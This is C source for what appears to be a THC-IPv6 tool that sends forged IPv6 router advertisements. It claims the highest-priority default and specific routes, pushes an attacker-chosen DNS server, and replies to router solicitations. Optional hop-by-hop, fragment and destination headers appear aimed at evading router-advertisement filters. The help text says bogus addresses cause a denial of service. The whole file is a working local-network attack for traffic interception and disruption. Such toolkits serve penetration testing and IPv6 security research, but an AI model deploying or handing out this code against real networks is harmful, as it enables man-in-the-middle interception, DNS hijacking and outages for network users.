#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

char *frbuf, *frbuf2, *frint, buf3[1504];
int frbuflen, frbuf2len, do_hop = 0, do_frag = 0, do_dst = 0, type = NXT_ICMP6,
                         myoff = 14;
unsigned char *frip6, *frmac;
thc_ipv6_hdr * frhdr = NULL;

void help(char *prg) {
  printf("%s %s (c) 2022 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf(
      "Syntax: %s [-HFD] interface network-address/prefix-length [dns-server "
      "[router-ip-link-local [mtu [mac-address]]]]\n\n",
      prg);
  printf(
      "Announce yourself as a router and try to become the default router.\n");
  printf(
      "If a non-existing link-local or mac address is supplied, this results "
      "in a DOS.\n");
  printf(
      "Option -H adds hop-by-hop, -F fragmentation header and -D dst "
      "header.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

void send_rs_reply(u_char *foo, const struct pcap_pkthdr *header,
                   const unsigned char *data) {
  unsigned char *pkt = NULL, *dstmac = (unsigned char *)data + 6,
                *dst = (unsigned char *)data + 14 + 8,
                *ipv6hdr = (unsigned char *)(data + 14);

  int pkt_len = 0, cnt, i;

  if (ipv6hdr[6] != NXT_ICMP6 || ipv6hdr[40] != ICMP6_ROUTERSOL ||
      header->caplen < 14 + 40 + 2)
    return;

  if ((pkt = thc_create_ipv6_extended(frint, PREFER_LINK, &pkt_len, frip6, dst,
                                      255, 0, 0, 0xe0, 0)) == NULL)
    return;
  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, frbuf2, frbuf2len) < 0) return;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff080800, frbuf,
                    frbuflen, 0) < 0)
    return;
  if (do_dst) {
    thc_generate_pkt(frint, frmac, dstmac, pkt, &pkt_len);
    frhdr = (thc_ipv6_hdr *)pkt;
    thc_send_as_fragment6(frint, frip6, dst, type, frhdr->pkt + 40 + myoff,
                          frhdr->pkt_len - 40 - myoff, 1240);
  } else {
    if (thc_generate_and_send_pkt(frint, frmac, dstmac, pkt, &pkt_len) < 0)
      return;
  }
  pkt = thc_destroy_packet(pkt);
}

int main(int argc, char *argv[]) {
  char *         routerip, *interface, mac[16] = "";
  unsigned char *routerip6, *route6, *mac6 = mac, *ip6;
  unsigned char  buf[512], *ptr, buf2[6],
      string[] = "ip6 and icmp6 and dst ff02::2";
  unsigned char *dst = thc_resolve6("ff02::1");
  unsigned char *dstmac = thc_get_multicast_mac(dst);
  unsigned char *dns;
  int            size, mtu = 1500, i, j, k, cnt;
  unsigned char *pkt = NULL;
  int            pkt_len = 0;
  int            rawmode = 0;
  pcap_t *       p;

  if (argc < 3 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  while ((i = getopt(argc, argv, "FHDr")) >= 0) {
    switch (i) {
      case 'r':
        thc_ipv6_rawmode(1);
        rawmode = 1;
        break;
      case 'F':
        do_frag++;
        break;
      case 'H':
        do_hop = 1;
        break;
      case 'D':
        do_dst = 1;
        break;
      default:
        fprintf(stderr, "Error: invalid option %c\n", i);
        exit(-1);
    }
  }

  if (argc - optind < 2) help(argv[0]);

  if (do_hdr_size) myoff = do_hdr_size;
  frbuf = buf;
  frbuf2 = buf2;
  frbuf2len = sizeof(buf2);
  memset(mac, 0, sizeof(mac));
  interface = argv[optind];
  mtu = thc_get_mtu(interface);
  if (argc - optind >= 5) mtu = atoi(argv[optind + 4]);
  if (argc - optind >= 7 && (ptr = argv[optind + 5]) != NULL)
    sscanf(ptr, "%x:%x:%x:%x:%x:%x", (unsigned int *)&mac[0],
           (unsigned int *)&mac[1], (unsigned int *)&mac[2],
           (unsigned int *)&mac[3], (unsigned int *)&mac[4],
           (unsigned int *)&mac[5]);
  else
    mac6 = thc_get_own_mac(interface);

  if (argc - optind >= 4 && argv[optind + 3] != NULL)
    ip6 = thc_resolve6(argv[optind + 3]);
  else
    ip6 = thc_get_own_ipv6(interface, NULL, PREFER_LINK);
  frip6 = ip6;
  frint = interface;
  frmac = mac6;

  if (argc - optind >= 4 && argv[optind + 2] != NULL)
    dns = thc_resolve6(argv[optind + 2]);
  else
    dns = thc_resolve6("ff02::fb");

  routerip = argv[optind + 1];
  if (routerip == NULL || (ptr = index(routerip, '/')) == NULL) {
    printf(
        "Error: Option must be supplied as IP-ADDRESS/PREFIXLENGTH, e.g. "
        "ff80::01/16\n");
    exit(-1);
  }
  *ptr++ = 0;
  size = atoi(ptr);

  routerip6 = thc_resolve6(routerip);
  route6 = thc_resolve6(routerip);

  if (routerip6 == NULL || size < 1 || size > 128) {
    fprintf(stderr, "Error: IP-ADDRESS/PREFIXLENGTH argument is invalid: %s\n",
            argv[optind + 1]);
    exit(-1);
  }
  if (size < 48 || size > 64)
    fprintf(stderr,
            "Warning: unusual network prefix size defined, be sure what your "
            "are doing: %d\n",
            size);
  if (dns == NULL) {
    fprintf(stderr, "Error: dns argument is invalid: %s\n", argv[optind + 2]);
    exit(-1);
  }
  if (ip6 == NULL) {
    fprintf(stderr, "Error: link-local-ip6 argument is invalid: %s\n",
            argv[optind + 3]);
    exit(-1);
  }
  if (mtu < 1 || mtu > 65536) {
    fprintf(stderr, "Error: mtu argument is invalid: %s\n", argv[optind + 4]);
    exit(-1);
  }
  if (mtu < 1228 || mtu > 1500)
    fprintf(
        stderr,
        "Warning: unusual mtu size defined, be sure what you are doing :%d\n",
        mtu);
  if (mac6 == NULL) {
    fprintf(stderr, "Error: mac address in invalid\n");
    exit(-1);
  }
  memset(buf, 0, sizeof(buf));
  memset(buf2, 0, sizeof(buf2));
  memset(buf3, 0, sizeof(buf3));

  if ((p = thc_pcap_init(interface, string)) == NULL) {
    fprintf(stderr, "Error: could not capture on interface %s with string %s\n",
            interface, string);
    exit(-1);
  }

  i = 128 - size;
  j = i / 8;
  k = i % 8;
  if (k > 0) j++;
  memset(route6 + 16 - j, 0, j);
  if (k > 0) route6[17 - j] = (route6[17 - j] >> (8 - k)) << (8 - k);

  //  buf[3] = 250; // 0-3: reachable timer
  buf[6] = 4;  // 4-7: retrans timer
  // option mtu
  buf[8] = 5;
  buf[9] = 1;
  buf[12] = mtu / 16777216;
  buf[13] = (mtu % 16777216) / 65536;
  buf[14] = (mtu % 65536) / 256;
  buf[15] = mtu % 256;
  // option prefix
  buf[16] = 3;
  buf[17] = 4;
  buf[18] = size;  // prefix length
  buf[19] = 128 + 64;
  memset(&buf[20], 17, 4);
  memset(&buf[24], 4, 4);
  memcpy(&buf[32], route6, 16);

  i = 48;
  // mac address option
  buf[i++] = 1;
  buf[i++] = 1;
  memcpy(buf + i, mac6, 6);
  i += 6;

  // default route routing option
  buf[i++] = 0x18;  // routing entry option type
  buf[i++] = 0x03;  // length 3 == 24 bytes
  buf[i++] = 0x00;  // prefix length
  buf[i++] = 0x08;  // priority, highest of course
  i += 2;           // 52-53 unknown
  buf[i++] = 0x11;  // lifetime, word
  buf[i++] = 0x11;  // lifetime, word
  i += 16;          // 56-71 address, all zeros for default

  // specific route routing option 2000::/3
  buf[i++] = 0x18;  // routing entry option type
  buf[i++] = 0x03;  // length 3 == 24 bytes
  buf[i++] = 0x03;  // prefix length
  buf[i++] = 0x08;  // priority, highest of course
  i += 2;           // 52-53 unknown
  buf[i++] = 0x11;  // lifetime, word
  buf[i++] = 0x11;  // lifetime, word
  buf[i++] = 0x20;  // 56-71 address: 2000::
  i += 15;

  // specific route routing option 2000::/3
  buf[i++] = 0x18;  // routing entry option type
  buf[i++] = 0x03;  // length 3 == 24 bytes
  buf[i++] = 0x07;  // prefix length
  buf[i++] = 0x08;  // priority, highest of course
  i += 2;           // 52-53 unknown
  buf[i++] = 0x11;  // lifetime, word
  buf[i++] = 0x11;  // lifetime, word
  buf[i++] = 0xfc;  // 56-71 address: fc::
  i += 15;

  // dns option
  buf[i++] = 0x19;        // dns option type
  buf[i++] = 0x03;        // length
  i += 2;                 // 74-75 reserved
  memset(buf + i, 1, 4);  // validity time
  i += 4;
  memcpy(buf + i, dns, 16);  // dns server
  i += 16;

  frbuflen = i;

  if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                      dst, 255, 0, 0, 0xe0, 0)) == NULL)
    return -1;

  if (do_hop) {
    type = NXT_HBH;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, frbuf2, 6) < 0) return -1;
  }
  if (do_frag) {
    type = NXT_FRAG;
    for (i = 0; i <= do_frag; i++)
      if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0) return -1;
  }
  if (do_dst) {
    if (type == NXT_ICMP6) type = NXT_DST;
    if (thc_add_hdr_dst(pkt, &pkt_len, buf3, sizeof(buf3)) < 0) return -1;
  }
  if (thc_add_icmp6(pkt, &pkt_len, ICMP6_ROUTERADV, 0, 0xff080800, buf, i, 0) <
      0)
    return -1;
  if (thc_generate_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) return -1;
  frhdr = (thc_ipv6_hdr *)pkt;

  // init pcap

  printf("Starting to advertise router %s (Press Control-C to end) ...\n",
         argv[optind + 1]);
  while (1) {
    if (do_dst) {
      thc_send_as_fragment6(interface, ip6, dst, type, frhdr->pkt + 40 + myoff,
                            frhdr->pkt_len - 40 - myoff, 1240);
    } else {
      thc_send_pkt(interface, pkt, &pkt_len);
    }
    while (thc_pcap_check(p, (char *)send_rs_reply, NULL) > 0)
      ;
    sleep(5);
  }
  return 0;
}
